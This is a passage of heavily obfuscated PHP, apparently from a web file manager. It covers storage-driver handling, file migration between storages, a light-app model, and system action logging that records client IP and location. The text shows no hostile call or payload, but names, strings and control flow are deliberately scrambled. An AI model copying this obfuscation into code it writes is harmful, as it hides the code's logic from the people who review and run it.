$this->driverType($C¯§ÑÜÀä¿); goto a‹¨ò¸¾; D®‹ñô¯: } private function driverType($cÎíŞÚ³±İ) { $cƒçàÛöÜ‡ =& $_SERVER[¯Ò¬Èè]; $cõ³ˆĞß“¶ = array($cƒçàÛöÜ‡[102] => $cƒçàÛöÜ‡[2382], $cƒçàÛöÜ‡[58] => $cƒçàÛöÜ‡[2383], $cƒçàÛöÜ‡[64] => $cƒçàÛöÜ‡[2384]); if (isset($cõ³ˆĞß“¶[$cÎíŞÚ³±İ])) { return $cõ³ˆĞß“¶[$cÎíŞÚ³±İ]; } return strtoupper($cÎíŞÚ³±İ); } public function driverListSystem() { $DŒöÄé„½Ã =& $_SERVER[¯Ò¬Èè]; $eøÉé‘—à = parent::listData(); $f¦ôäÎ§‹° = array(); foreach ($eøÉé‘—à as $eêÅÃì‹í¸) { unset($eêÅÃì‹í¸[$DŒöÄé„½Ã[187]], $eêÅÃì‹í¸[$DŒöÄé„½Ã[107]]); $eêÅÃì‹í¸[$DŒöÄé„½Ã[6]] = json_decode($eêÅÃì‹í¸[$DŒöÄé„½Ã[6]], !0); $f¦ôäÎ§‹°[] = $eêÅÃì‹í¸; } return $f¦ôäÎ§‹°; } public function defaultDriver() { $DÚŠŠ©÷¥‡ =& $_SERVER[¯Ò¬Èè]; $CÏ—°¬õÚ = parent::listData(); $e®Ì¸ÇŒÃä = array_filter_by_field($CÏ—°¬õÚ, $DÚŠŠ©÷¥‡[34], 1); $e®Ì¸ÇŒÃä = $e®Ì¸ÇŒÃä[0]; if ($e®Ì¸ÇŒÃä) { $e®Ì¸ÇŒÃä[$DÚŠŠ©÷¥‡[6]] = json_decode($e®Ì¸ÇŒÃä[$DÚŠŠ©÷¥‡[6]], !0); } return $e®Ì¸ÇŒÃä; } public function driverInfo($Bº‘ßÎó–µ) { $d‹ìÓ¯Û½Ø =& $_SERVER[¯Ò¬Èè]; $b¥„¹À¿Şº = array_to_keyvalue(parent::listData(), $d‹ìÓ¯Û½Ø[367]); if (!isset($b¥„¹À¿Şº[$Bº‘ßÎó–µ])) { return !1; } $cšê¿ç´º£ = $b¥„¹À¿Şº[$Bº‘ßÎó–µ]; $cšê¿ç´º£[$d‹ìÓ¯Û½Ø[6]] = json_decode($cšê¿ç´º£[$d‹ìÓ¯Û½Ø[6]], !0); return $cšê¿ç´º£; } public function remove($D²¡šß†Ï) { $this->removeShareItems($D²¡šß†Ï); return parent::remove($D²¡šß†Ï); } public function removeWithFile($c÷Šµá‡Ë) { goto cÀ¤‘œ¤Ğ‰; cæ×òÒ–ˆì: $a¥å¸ÔÑİ = "\173\x69\x6f\72{$e™’Õó¨Ë©}\175\x2f"; $CâÜ§‡İ¥ò = !0; $bÀ¶¹ĞØÖ = array(); goto fÖ­ˆ šĞ; AíìÍ„ÔŒÅ: if (!$CâÜ§‡İ¥ò) { $F²¶ğÇŒ—->stop($E¼ƒÇĞĞÂ‘); return !1; } $F²¶ğÇŒ—->end(); $this->remove($c÷Šµá‡Ë); goto f·Ë­ ƒ×í; D£¶éœçîŠ: $fí´îÛ—¬ = Model($E´ÛŠÃÈ¹˜[422])->where($F‡ÂÎÁÑ¼ƒ)->sum($E´ÛŠÃÈ¹˜[77]); $E¼ƒÇĞĞÂ‘ = $E´ÛŠÃÈ¹˜[2385] . $c÷Šµá‡Ë; $F²¶ğÇŒ— = new TaskFileTransfer($E¼ƒÇĞĞÂ‘, $E´ÛŠÃÈ¹˜[2386], $fÖµÓà‡Æ, LNG($E´ÛŠÃÈ¹˜[2387]) . "\x28{$c÷Šµá‡Ë}\x29"); goto dùİÜÂÔÁ; dùİÜÂÔÁ: $F²¶ğÇŒ—->task[$E´ÛŠÃÈ¹˜[712]] = (double) $fí´îÛ—¬; $A÷ÜÏ”º‡ = KodIO::defaultDriver(); $e™’Õó¨Ë© = $A÷ÜÏ”º‡[$E´ÛŠÃÈ¹˜[367]]; goto cæ×òÒ–ˆì; cÀ¤‘œ¤Ğ‰: $E´ÛŠÃÈ¹˜ =& $_SERVER[¯Ò¬Èè]; $F‡ÂÎÁÑ¼ƒ = array($E´ÛŠÃÈ¹˜[758] => $c÷Šµá‡Ë); $fÖµÓà‡Æ = Model($E´ÛŠÃÈ¹˜[422])->where($F‡ÂÎÁÑ¼ƒ)->count(); goto D£¶éœçîŠ; fÖ­ˆ šĞ: $C›©åÏÅ•é = Model($E´ÛŠÃÈ¹˜[167])->where($F‡ÂÎÁÑ¼ƒ)->field($E´ÛŠÃÈ¹˜[2388])->select(); foreach ($C›©åÏÅ•é as $fà¥ŒŞ°é„) { goto dö­ë§›Âœ; dö­ë§›Âœ: $c—ì¢­÷“ = $fà¥ŒŞ°é„[$E´ÛŠÃÈ¹˜[75]]; $dÉ²Ããî² = $a¥å¸ÔÑİ . str_replace("\173\x69\x6f\72{$c÷Šµá‡Ë}\x7d\x2f", $E´ÛŠÃÈ¹˜[33], $c—ì¢­÷“); if (!IO::exist($c—ì¢­÷“)) { $bÀ¶¹ĞØÖ[] = $fà¥ŒŞ°é„[$E´ÛŠÃÈ¹˜[419]]; $F²¶ğÇŒ—->updateFileEnd($fà¥ŒŞ°é„[$E´ÛŠÃÈ¹˜[28]], $fà¥ŒŞ°é„[$E´ÛŠÃÈ¹˜[77]]); continue; } goto c¥¿‰¶¹¿; eÇô¿Îœ¥: $AÒ”Ğ¶¿·á = array($E´ÛŠÃÈ¹˜[758] => $e™’Õó¨Ë©, $E´ÛŠÃÈ¹˜[75] => $dÉ²Ããî²); Model($E´ÛŠÃÈ¹˜[167])->where($F‡ÂÎÁÑ¼ƒ)->save($AÒ”Ğ¶¿·á); goto a¡÷İÜŠ±æ; c¥¿‰¶¹¿: if (IO::exist($dÉ²Ããî²)) { $F²¶ğÇŒ—->updateFileEnd($fà¥ŒŞ°é„[$E´ÛŠÃÈ¹˜[28]], $fà¥ŒŞ°é„[$E´ÛŠÃÈ¹˜[77]]); continue; } if (!IO::move($c—ì¢­÷“, get_path_father($dÉ²Ããî²))) { $CâÜ§‡İ¥ò = !1; break; } $F‡ÂÎÁÑ¼ƒ = array($E´ÛŠÃÈ¹˜[419] => $fà¥ŒŞ°é„[$E´ÛŠÃÈ¹˜[419]]); goto eÇô¿Îœ¥; a¡÷İÜŠ±æ: } $this->removeByFileID($bÀ¶¹ĞØÖ); goto AíìÍ„ÔŒÅ; f·Ë­ ƒ×í: } public function progress($f§„•ë…²) { return Task::get($_SERVER[¯Ò¬Èè][2385] . $f§„•ë…²); } private function removeByFileID($FØÎÏ°Í¯ = array()) { goto EìŠ‹Œ«ÂÜ; a‡³‹ßùÊÛ: $D˜Á¦à…íº = Model($AÙ¼Ë±áº[1126])->where($f¾Ä§ÓÀÈ)->field($AÙ¼Ë±áº[369])->select(); if (!$D˜Á¦à…íº) { return; } $D˜Á¦à…íº = array_to_keyvalue($D˜Á¦à…íº, $AÙ¼Ë±áº[33], $AÙ¼Ë±áº[369]); goto fëÜˆáŠ¥Ù; EìŠ‹Œ«ÂÜ: $AÙ¼Ë±áº =& $_SERVER[¯Ò¬Èè]; if (empty($FØÎÏ°Í¯)) { return; } $f¾Ä§ÓÀÈ = array($AÙ¼Ë±áº[419] => array($AÙ¼Ë±áº[7], $FØÎÏ°Í¯)); goto a‡³‹ßùÊÛ; fëÜˆáŠ¥Ù: foreach ($D˜Á¦à…íº as $E‡‹™³›·±) { Model($AÙ¼Ë±áº[382])->removeNow($E‡‹™³›·±, !1); } goto EïØ¬Û¶â; EïØ¬Û¶â: } private function removeShareItems($dŒ¯ôĞ°«) { goto d£”ç«öè; bØÛÑ»Ù”: $AºöÒÒÂ³Î = Model($E¸ñ£ó’‘Ş[2091])->where($C…²˜Ãõº†)->field($E¸ñ£ó’‘Ş[441])->select(); if (empty($AºöÒÒÂ³Î)) { return; } $F†¤Áª¶³õ = array_to_keyvalue($AºöÒÒÂ³Î, $E¸ñ£ó’‘Ş[33], $E¸ñ£ó’‘Ş[441]); goto AÛŸÓİ”; AÛŸÓİ”: Model($E¸ñ£ó’‘Ş[545])->remove($F†¤Áª¶³õ); goto bùôÅ±ùæ; d£”ç«öè: $E¸ñ£ó’‘Ş =& $_SERVER[¯Ò¬Èè]; $C‚£ÓööÖ• = "\173\151\157\72{$dŒ¯ôĞ°«}\175\x2f"; $C…²˜Ãõº† = array($E¸ñ£ó’‘Ş[369] => 0, $E¸ñ£ó’‘Ş[1028] => array($E¸ñ£ó’‘Ş[766], "{$C‚£ÓööÖ•}\45")); goto bØÛÑ»Ù”; bùôÅ±ùæ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x4c\151\147\150\164\x41\x70\160"; public $modelType = "\x53\171\x73\x74\145\x6d\117\160\164\151\x6f\156"; public $field = array("\156\141\x6d\145", "\x67\162\x6f\165\x70", "\144\x65\163\143", "\143\x6f\x6e\164\x65\156\x74"); public function listData($EŒ½å¶‹è = false, $F”ÁİˆÄ‹£ = "\155\157\x64\151\146\x79\x54\151\x6d\x65", $a»¡¾Á†§† = true) { return parent::listData($EŒ½å¶‹è, $F”ÁİˆÄ‹£, $a»¡¾Á†§†); } public function remove($Aè·íƒ‚Ã) { $f…ùÑÆÚÃ = $this->findByName($Aè·íƒ‚Ã); if (!$f…ùÑÆÚÃ) { return !1; } return parent::remove($f…ùÑÆÚÃ[$_SERVER[¯Ò¬Èè][367]]); } public function add($Bâ¼†Œåî½) { if ($this->findByName($Bâ¼†Œåî½[$_SERVER[¯Ò¬Èè][28]])) { return !1; } return parent::insert($Bâ¼†Œåî½); } public function update($b¡ôóµî, $F¶—¯½å‚Õ) { $a™”ÄÔËÕÅ =& $_SERVER[¯Ò¬Èè]; $aÒ½´šÃ¬÷ = $this->findByName($b¡ôóµî); $C­»ì¨î×¯ = $this->findByName($F¶—¯½å‚Õ[$a™”ÄÔËÕÅ[28]]); if (!$aÒ½´šÃ¬÷ || $C­»ì¨î×¯ && $C­»ì¨î×¯[$a™”ÄÔËÕÅ[367]] != $aÒ½´šÃ¬÷[$a™”ÄÔËÕÅ[367]]) { return !1; } return parent::update($aÒ½´šÃ¬÷[$a™”ÄÔËÕÅ[367]], $F¶—¯½å‚Õ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\124\x69\x6d\145", "\164\x69\155\x65", "\151\156\x73\145\x72\164", "\146\x75\156\x63\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $e…¾¤Ê¶‚‚ =& $_SERVER[¯Ò¬Èè]; return array($e…¾¤Ê¶‚‚[2389] => LNG($e…¾¤Ê¶‚‚[2390]), $e…¾¤Ê¶‚‚[2391] => LNG($e…¾¤Ê¶‚‚[2392]), $e…¾¤Ê¶‚‚[2053] => LNG($e…¾¤Ê¶‚‚[2393]), $e…¾¤Ê¶‚‚[2394] => LNG($e…¾¤Ê¶‚‚[2395]), $e…¾¤Ê¶‚‚[2396] => LNG($e…¾¤Ê¶‚‚[2397]), $e…¾¤Ê¶‚‚[2398] => LNG($e…¾¤Ê¶‚‚[2399]), $e…¾¤Ê¶‚‚[2400] => LNG($e…¾¤Ê¶‚‚[2401]), $e…¾¤Ê¶‚‚[2402] => LNG($e…¾¤Ê¶‚‚[2403]), $e…¾¤Ê¶‚‚[2084] => LNG($e…¾¤Ê¶‚‚[2404]), $e…¾¤Ê¶‚‚[2085] => LNG($e…¾¤Ê¶‚‚[2405]), $e…¾¤Ê¶‚‚[2406] => LNG($e…¾¤Ê¶‚‚[2407]), $e…¾¤Ê¶‚‚[2408] => LNG($e…¾¤Ê¶‚‚[2409]), $e…¾¤Ê¶‚‚[2410] => LNG($e…¾¤Ê¶‚‚[2411]), $e…¾¤Ê¶‚‚[2412] => LNG($e…¾¤Ê¶‚‚[2413]), $e…¾¤Ê¶‚‚[2082] => LNG($e…¾¤Ê¶‚‚[2414]), $e…¾¤Ê¶‚‚[2089] => LNG($e…¾¤Ê¶‚‚[2415]), $e…¾¤Ê¶‚‚[2416] => LNG($e…¾¤Ê¶‚‚[2417]), $e…¾¤Ê¶‚‚[2418] => LNG($e…¾¤Ê¶‚‚[2419]), $e…¾¤Ê¶‚‚[2420] => LNG($e…¾¤Ê¶‚‚[2421]), $e…¾¤Ê¶‚‚[2422] => LNG($e…¾¤Ê¶‚‚[2423]), $e…¾¤Ê¶‚‚[2092] => LNG($e…¾¤Ê¶‚‚[2424]), $e…¾¤Ê¶‚‚[2093] => LNG($e…¾¤Ê¶‚‚[2425]), $e…¾¤Ê¶‚‚[2426] => LNG($e…¾¤Ê¶‚‚[2427]), $e…¾¤Ê¶‚‚[2428] => LNG($e…¾¤Ê¶‚‚[2429]), $e…¾¤Ê¶‚‚[2430] => LNG($e…¾¤Ê¶‚‚[2431]), $e…¾¤Ê¶‚‚[2087] => LNG($e…¾¤Ê¶‚‚[2432]), $e…¾¤Ê¶‚‚[2433] => LNG($e…¾¤Ê¶‚‚[2434]), $e…¾¤Ê¶‚‚[2086] => LNG($e…¾¤Ê¶‚‚[2435]), $e…¾¤Ê¶‚‚[2436] => LNG($e…¾¤Ê¶‚‚[2437]), $e…¾¤Ê¶‚‚[2438] => LNG($e…¾¤Ê¶‚‚[2439]), $e…¾¤Ê¶‚‚[2440] => LNG($e…¾¤Ê¶‚‚[2440]), $e…¾¤Ê¶‚‚[2441] => LNG($e…¾¤Ê¶‚‚[2057]), $e…¾¤Ê¶‚‚[2442] => LNG($e…¾¤Ê¶‚‚[2443]), $e…¾¤Ê¶‚‚[2444] => LNG($e…¾¤Ê¶‚‚[2445]), $e…¾¤Ê¶‚‚[2446] => LNG($e…¾¤Ê¶‚‚[2447]), $e…¾¤Ê¶‚‚[2448] => LNG($e…¾¤Ê¶‚‚[2449]), $e…¾¤Ê¶‚‚[2450] => LNG($e…¾¤Ê¶‚‚[2451]), $e…¾¤Ê¶‚‚[2452] => LNG($e…¾¤Ê¶‚‚[2452]), $e…¾¤Ê¶‚‚[2453] => LNG($e…¾¤Ê¶‚‚[2454]), $e…¾¤Ê¶‚‚[2455] => LNG($e…¾¤Ê¶‚‚[2456]), $e…¾¤Ê¶‚‚[2457] => LNG($e…¾¤Ê¶‚‚[2458]), $e…¾¤Ê¶‚‚[2459] => LNG($e…¾¤Ê¶‚‚[2460]), $e…¾¤Ê¶‚‚[2461] => LNG($e…¾¤Ê¶‚‚[2462]), $e…¾¤Ê¶‚‚[2463] => LNG($e…¾¤Ê¶‚‚[2464])); } private function typeFile() { $f¤ÃîØ±˜‹ =& $_SERVER[¯Ò¬Èè]; $A¯…“ó´Ú» = array($f¤ÃîØ±˜‹[2089] => array($f¤ÃîØ±˜‹[2090]), $f¤ÃîØ±˜‹[2410] => array($f¤ÃîØ±˜‹[2465]), $f¤ÃîØ±˜‹[2412] => array($f¤ÃîØ±˜‹[2466]), $f¤ÃîØ±˜‹[2082] => array($f¤ÃîØ±˜‹[2083]), $f¤ÃîØ±˜‹[2418] => array(), $f¤ÃîØ±˜‹[2420] => array(), $f¤ÃîØ±˜‹[2422] => array(), $f¤ÃîØ±˜‹[2092] => array($f¤ÃîØ±˜‹[2094]), $f¤ÃîØ±˜‹[2093] => array($f¤ÃîØ±˜‹[2094]), $f¤ÃîØ±˜‹[2426] => array($f¤ÃîØ±˜‹[2467]), $f¤ÃîØ±˜‹[2428] => array($f¤ÃîØ±˜‹[2467]), $f¤ÃîØ±˜‹[2430] => array($f¤ÃîØ±˜‹[2468]), $f¤ÃîØ±˜‹[2416] => array($f¤ÃîØ±˜‹[2469]), $f¤ÃîØ±˜‹[2087] => array($f¤ÃîØ±˜‹[2470]), $f¤ÃîØ±˜‹[2433] => array($f¤ÃîØ±˜‹[2471]), $f¤ÃîØ±˜‹[2086] => array($f¤ÃîØ±˜‹[2088])); return $A¯…“ó´Ú»; } private function typeAll() { goto Bƒ“Ùé°÷’; Bƒ“Ùé°÷’: $bƒ¹À«äæÓ =& $_SERVER[¯Ò¬Èè]; $bƒÔÆ‰ ‰‚ = $this->typeList; $báÂ„Ğì• = array_filter($this->typeFile()); goto c»ôÍ¼‘½°; c»ôÍ¼‘½°: foreach ($báÂ„Ğì• as $AÖì„Ñëô => $fì¨ä¶áªš) { $bƒÔÆ‰ ‰‚[$fì¨ä¶áªš[0]] = $bƒÔÆ‰ ‰‚[$AÖì„Ñëô]; } $bƒÔÆ‰ ‰‚[$bƒ¹À«äæÓ[2094]] = LNG($bƒ¹À«äæÓ[2472]); $bƒÔÆ‰ ‰‚[$bƒ¹À«äæÓ[2467]] = LNG($bƒ¹À«äæÓ[2473]); goto fò¯šõƒ×¨; fò¯šõƒ×¨: return $bƒÔÆ‰ ‰‚; goto BÅä©Ë‡ø; BÅä©Ë‡ø: } public function addLog($f‹ëƒ’ˆğ, $fŞÁêŒ¡— = array()) { goto B¯œäÉ•—µ; BÏáà—­: $dè†İÅÍëî = get_client_ip(); if (!$fŞÁêŒ¡— || strlen(json_encode($fŞÁêŒ¡—)) >= 1024) { $fŞÁêŒ¡— = array($b¸½¥ƒ„Ùî[2474] => $dè†İÅÍëî); } else { if (is_array($fŞÁêŒ¡—)) { $fŞÁêŒ¡—[$b¸½¥ƒ„Ùî[2474]] = $dè†İÅÍëî; } else { $fŞÁêŒ¡— = array($b¸½¥ƒ„Ùî[1043] => $fŞÁêŒ¡—, $b¸½¥ƒ„Ùî[2474] => $dè†İÅÍëî); } } $fŞÁêŒ¡— = array($b¸½¥ƒ„Ùî[1436] => Session::sign(), $b¸½¥ƒ„Ùî[1437] => $fÜöÎù¦ñ, $b¸½¥ƒ„Ùî[29] => $f‹ëƒ’ˆğ, $b¸½¥ƒ„Ùî[1439] => json_encode($fŞÁêŒ¡—)); goto f™óÒÍµ£; B¯œäÉ•—µ: $b¸½¥ƒ„Ùî =& $_SERVER[¯Ò¬Èè]; if (!isset($this->typeList[$f‹ëƒ’ˆğ])) { return; } $fÜöÎù¦ñ = USER_ID ? USER_ID : (isset($fŞÁêŒ¡—[$b¸½¥ƒ„Ùî[1446]]) ? $fŞÁêŒ¡—[$b¸½¥ƒ„Ùî[1446]] : 0); goto BÏáà—­; f™óÒÍµ£: parent::add($fŞÁêŒ¡—); goto cŸ¤ÔŒØ–¼; cŸ¤ÔŒØ–¼: } public function remove($FÃ»¶çñé°) { $this->where(array($_SERVER[¯Ò¬Èè][385] => $FÃ»¶çñé°))->delete(); } private function _makeOrder($F§­§¡¢ = '') { goto dÙÍ¼†£ÎÃ; DãÏ‡ØÉ•: $DÄ®Ú“¸ÅŠ = Input::get($dåğ¸‹‰[408], $dåğ¸‹‰[7], $dåğ¸‹‰[2252], array($dåğ¸‹‰[2189], $dåğ¸‹‰[404])); $DÄ®Ú“¸ÅŠ = $F’´²Õ‹šÁ[$DÄ®Ú“¸ÅŠ]; $F§­§¡¢ = $F§­§¡¢ . "{$f˜³ÖÛ•›ø}\x20{$DÄ®Ú“¸ÅŠ}"; goto d—ÛÄ¡Ø; d—ÛÄ¡Ø: return $this->order($F§­§¡¢); goto f‹À§¦ÍÇ; dÙÍ¼†£ÎÃ: $dåğ¸‹‰ =& $_SERVER[¯Ò¬Èè]; $f˜³ÖÛ•›ø = $dåğ¸‹‰[187]; $F’´²Õ‹šÁ = array($dåğ¸‹‰[402] => $dåğ¸‹‰[403], $dåğ¸‹‰[404] => $dåğ¸‹‰[405]); goto DãÏ‡ØÉ•; f‹À§¦ÍÇ: } public function get($d·ÎÈÄê°Ÿ = '') { goto aéÕ¹Œµ³õ; f»Õ²–±¹Ş: $FàÔª¥ó••[$Eˆ¡µğÃœ«[354]] = $this->logList($FàÔª¥ó••[$Eˆ¡µğÃœ«[354]]); return $FàÔª¥ó••; goto A¹™„ğ¿‚›; aéÕ¹Œµ³õ: $Eˆ¡µğÃœ« =& $_SERVER[¯Ò¬Èè]; if (!$d·ÎÈÄê°Ÿ) { show_json(array()); } $aãğ„®õï£ = array(); goto eñ×ç†š; dÑù¦¿¢éƒ: if (!empty($d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[2474]])) { $aãğ„®õï£[$Eˆ¡µğÃœ«[405]] = array($Eˆ¡µğÃœ«[766], "\x25{$d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[2474]]}\x25"); } $FàÔª¥ó•• = $this->_makeOrder()->where($aãğ„®õï£)->selectPage(); if (empty($FàÔª¥ó••[$Eˆ¡µğÃœ«[354]])) { show_json(array(), !0, $FàÔª¥ó••[$Eˆ¡µğÃœ«[351]]); } goto f»Õ²–±¹Ş; eñ×ç†š: if ($d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[1446]]) { $aãğ„®õï£[$Eˆ¡µğÃœ«[1446]] = $d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[1446]]; } if (isset($d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[716]])) { $F£ìïê£‰ = $d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[716]]; $déç³¬£”¾ = isset($d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[717]]) ? $d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[717]] : time(); $aãğ„®õï£[$Eˆ¡µğÃœ«[187]] = array($Eˆ¡µğÃœ«[321], array($F£ìïê£‰, $déç³¬£”¾)); } if ($d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[29]]) { $D‡·Æ„è‚ = explode($Eˆ¡µğÃœ«[47], $d·ÎÈÄê°Ÿ[$Eˆ¡µğÃœ«[29]]); $b˜Šò‚§¯î = $this->typeFile(); $Aëî²¥ÒÏè = array(); foreach ($D‡·Æ„è‚ as $f±ã­ÎÜ¾½) { $Aëî²¥ÒÏè[] = $f±ã­ÎÜ¾½; if (isset($b˜Šò‚§¯î[$f±ã­ÎÜ¾½])) { $Aëî²¥ÒÏè = array_merge($Aëî²¥ÒÏè, $b˜Šò‚§¯î[$f±ã­ÎÜ¾½]); } } $Aëî²¥ÒÏè = array_unique($Aëî²¥ÒÏè); if ($Aëî²¥ÒÏè) { $aãğ„®õï£[$Eˆ¡µğÃœ«[29]] = array($Eˆ¡µğÃœ«[7], $Aëî²¥ÒÏè); } } goto dÑù¦¿¢éƒ; A¹™„ğ¿‚›: } private function ipAddress(&$C¦×íÌºÊ) { $fÜÄêÃÏ»¤ =& $_SERVER[¯Ò¬Èè]; if (!empty($C¦×íÌºÊ[$fÜÄêÃÏ»¤[2474]])) { $eÅÅí×’Ğ¹ = IpLocation::get($C¦×íÌºÊ[$fÜÄêÃÏ»¤[2474]]); } else { $eÅÅí×’Ğ¹ = LNG($fÜÄêÃÏ»¤[2475]); } $C¦×íÌºÊ[$fÜÄêÃÏ»¤[2476]] = $eÅÅí×’Ğ¹; } private function descZipDownload($d“Å”ËË½‡, &$f†Ø°ôÚ ) { $dº—ˆêê¡¾ =& $_SERVER[¯Ò¬Èè]; if (!isset($d“Å”ËË½‡[$dº—ˆêê¡¾[2477]])) { return; } $E™¨÷¾¬Ü– = json_decode($d“Å”ËË½‡[$dº—ˆêê¡¾[2477]], !0); foreach ($E™¨÷¾¬Ü– as $cö¿ŠÌ®â”) { if (!IO::init($cö¿ŠÌ®â”[$dº—ˆêê¡¾[75]])) { continue; } if (!($còå·Ã·  = IO::infoFull($cö¿ŠÌ®â”[$dº—ˆêê¡¾[75]]))) { continue; } $d“Å”ËË½‡[$dº—ˆêê¡¾[75]] = $cö¿ŠÌ®â”[$dº—ˆêê¡¾[75]]; $f†Ø°ôÚ [] = $d“Å”ËË½‡[$dº—ˆêê¡¾[369]] = $còå·Ã· [$dº—ˆêê¡¾[369]]; $f†Ø°ôÚ [] = $d“Å”ËË½‡[$dº—ˆêê¡¾[2295]] = $còå·Ã· [$dº—ˆêê¡¾[461]]; break; } return $d“Å”ËË½‡; } private function getSourceList(&$cÔòÎÆ©Á) { $fà´Ş·š˜Ğ =& $_SERVER[¯Ò¬Èè]; $CÈˆ‚…ì˜× = array(); foreach ($cÔòÎÆ©Á as $dÌÒ¼ßÖ¿“ => $eÒ«á„´Åó) { goto AË…ç•‡—‰; CÈ§§¦ˆ•Ï: $CÈˆ‚…ì˜×[] = $C“à”±–Ê[$fà´Ş·š˜Ğ[369]]; $CÈˆ‚…ì˜×[] = $C“à”±–Ê[$fà´Ş·š˜Ğ[2295]]; if ($C“à”±–Ê[$fà´Ş·š˜Ğ[29]] == $fà´Ş·š˜Ğ[501]) { $CÈˆ‚…ì˜×[] = $C“à”±–Ê[$fà´Ş·š˜Ğ[405]][$fà´Ş·š˜Ğ[1016]]; $CÈˆ‚…ì˜×[] = $C“à”±–Ê[$fà´Ş·š˜Ğ[405]][$fà´Ş·š˜Ğ[1017]]; } goto E‹†ÑôŸ‡Ã; E‹†ÑôŸ‡Ã: if ($C“à”±–Ê[$fà´Ş·š˜Ğ[29]] == $fà´Ş·š˜Ğ[2303]) { $CÈˆ‚…ì˜×[] = $C“à”±–Ê[$fà´Ş·š˜Ğ[405]][$fà´Ş·š˜Ğ[369]]; } goto fÁ«×Ÿ•ë…; AË…ç•‡—‰: $C“à”±–Ê = json_decode($eÒ«á„´Åó[$fà´Ş·š˜Ğ[405]], !0); if ($eÒ«á„´Åó[$fà´Ş·š˜Ğ[29]] == $fà´Ş·š˜Ğ[2085]) { $C“à”±–Ê = $this->descZipDownload($C“à”±–Ê, $CÈˆ‚…ì˜×); $cÔòÎÆ©Á[$dÌÒ¼ßÖ¿“][$fà´Ş·š˜Ğ[405]] = json_encode($C“à”±–Ê); continue; } if (strpos($eÒ«á„´Åó[$fà´Ş·š˜Ğ[29]], $fà´Ş·š˜Ğ[2296]) !== 0) { goto eéô¸„˜²“; eéô¸„˜²“: if (!isset($C“à”±–Ê[$fà´Ş·š˜Ğ[75]]) || strpos($eÒ«á„´Åó[$fà´Ş·š˜Ğ[29]], $fà´Ş·š˜Ğ[2478]) !== 0) { continue; } if (!IO::init($C“à”±–Ê[$fà´Ş·š˜Ğ[75]])) { continue; } if (!($eˆ„–ó©“õ = IO::infoFull($C“à”±–Ê[$fà´Ş·š˜Ğ[75]]))) { continue; } goto d›ÚÑ›ì”š; d›ÚÑ›ì”š: $CÈˆ‚…ì˜×[] = $C“à”±–Ê[$fà´Ş·š˜Ğ[369]] = $eˆ„–ó©“õ[$fà´Ş·š˜Ğ[369]]; $CÈˆ‚…ì˜×[] = $C“à”±–Ê[$fà´Ş·š˜Ğ[2295]] = $eˆ„–ó©“õ[$fà´Ş·š˜Ğ[461]]; $cÔòÎÆ©Á[$dÌÒ¼ßÖ¿“][$fà´Ş·š˜Ğ[405]] = json_encode($C“à”±–Ê); goto dÜ°Åµ¾; dÜ°Åµ¾: continue; goto Fê«¼ë; Fê«¼ë: } goto CÈ§§¦ˆ•Ï; fÁ«×Ÿ•ë…: } if (!$CÈˆ‚…ì˜×) { return array(); } return Model($fà´Ş·š˜Ğ[767])->sourceListInfo($CÈˆ‚…ì˜×, !0); } private function logList($d»·²ŠµÃ—) { goto FÕğïƒ‡²¸; c—ÌÏŒ‰âµ: return $CÒÊà¿Øš¤; goto EàçÍ‘½œä; cˆóÉÁƒÜò: $d‚–æË– = array(); foreach ($d»·²ŠµÃ— as $bêÚ‡”á©Æ => $c·¿½Ç«¤) { goto D¼âŒ©©î; DŠ¶ìÊã¥²: unset($c·¿½Ç«¤[$d”ËĞ‹ì±‰[2481]]); $CÒÊà¿Øš¤[] = $c·¿½Ç«¤; goto a ì—’¾ËÑ; C»¦¨ŞÌğ: $this->ipAddress($c·¿½Ç«¤); if (strpos($aÍ¾¥šó¨´, $d”ËĞ‹ì±‰[2296]) === 0 || isset($aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2295]])) { goto B±ÆÈëÍõ; B±ÆÈëÍõ: $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[391]] = $aÊŞäĞŒ’˜[$aïùåñ¸£Ø[$d”ËĞ‹ì±‰[369]]]; $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2308]] = $aÊŞäĞŒ’˜[$aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2295]]]; if ($aïùåñ¸£Ø[$d”ËĞ‹ì±‰[29]] == $d”ËĞ‹ì±‰[501]) { $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[405]][$d”ËĞ‹ì±‰[1016]] = $aÊŞäĞŒ’˜[$aïùåñ¸£Ø[$d”ËĞ‹ì±‰[405]][$d”ËĞ‹ì±‰[1016]]]; $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[405]][$d”ËĞ‹ì±‰[1017]] = $aÊŞäĞŒ’˜[$aïùåñ¸£Ø[$d”ËĞ‹ì±‰[405]][$d”ËĞ‹ì±‰[1017]]]; } goto eÊÂÌ‚èÚ; E‘†™à˜Î: if ($aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2308]] && $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2308]][$d”ËĞ‹ì±‰[371]] == $d”ËĞ‹ì±‰[1089]) { $d‚–æË–[] = $c·¿½Ç«¤[$d”ËĞ‹ì±‰[367]]; unset($d»·²ŠµÃ—[$bêÚ‡”á©Æ]); continue; } goto FÁˆÁâŸ«Ì; eÊÂÌ‚èÚ: if ($aïùåñ¸£Ø[$d”ËĞ‹ì±‰[29]] == $d”ËĞ‹ì±‰[2303]) { $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[405]][$d”ËĞ‹ì±‰[369]] = $aÊŞäĞŒ’˜[$aïùåñ¸£Ø[$d”ËĞ‹ì±‰[405]][$d”ËĞ‹ì±‰[369]]]; } if 